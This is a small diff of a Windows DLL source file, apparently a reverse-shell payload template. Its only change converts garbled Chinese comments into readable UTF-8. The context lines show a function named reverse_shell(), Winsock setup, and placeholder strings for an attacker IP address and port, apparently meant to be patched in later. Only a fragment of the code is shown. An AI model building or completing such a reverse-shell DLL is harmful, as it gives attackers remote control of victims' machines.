@@ -1,4 +1,4 @@
-// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
+// dllmain.cpp : 定义 DLL 应用程序的入口点。
 #include "stdafx.h"
 #include <winsock2.h>  
 #include <stdlib.h>
@@ -61,9 +61,9 @@ void reverse_shell()
 	}
 	}
 
-	TCHAR szIpAddress[] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAA";                                 // IP��ַ
-	TCHAR szPort[] = L"BBBBBBBBBBBBBBBBBBBBBBBBBBBB";                                      // �˿ں�
-	TCHAR szOtherInfo[] = L"CCCCCCCCCCCCCCCCCCCCCCCCCCCC";                                 // ������Ϣ
+	TCHAR szIpAddress[] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAA";                                 // IP地址
+	TCHAR szPort[] = L"BBBBBBBBBBBBBBBBBBBBBBBBBBBB";                                      // 端口号
+	TCHAR szOtherInfo[] = L"CCCCCCCCCCCCCCCCCCCCCCCCCCCC";                                 // 其他信息
 
 
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
